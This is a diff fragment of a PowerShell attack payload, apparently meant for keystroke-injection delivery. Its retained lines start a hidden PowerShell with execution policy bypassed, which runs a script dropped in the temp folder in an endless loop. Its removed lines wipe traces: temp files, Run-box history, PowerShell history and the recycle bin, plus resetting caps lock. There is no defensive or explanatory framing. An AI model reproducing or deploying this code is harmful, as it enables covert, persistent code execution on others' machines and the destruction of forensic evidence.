@@ -56,21 +56,3 @@ $Window.ShowDialog() | out-null
 
 $D="$env:TMP"+'\rr'
 powershell -w h -NoP -NonI -Exec Bypass 'while ($true) { $D\rr1.ps1; }'
-
-# Turn of capslock if it is left on
-
-$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
-if ($caps -eq $true){$key = New-Object -ComObject WScript.Shell;$key.SendKeys('{CapsLock}')}
-
-
-# empty temp folder
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Empty recycle bin
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
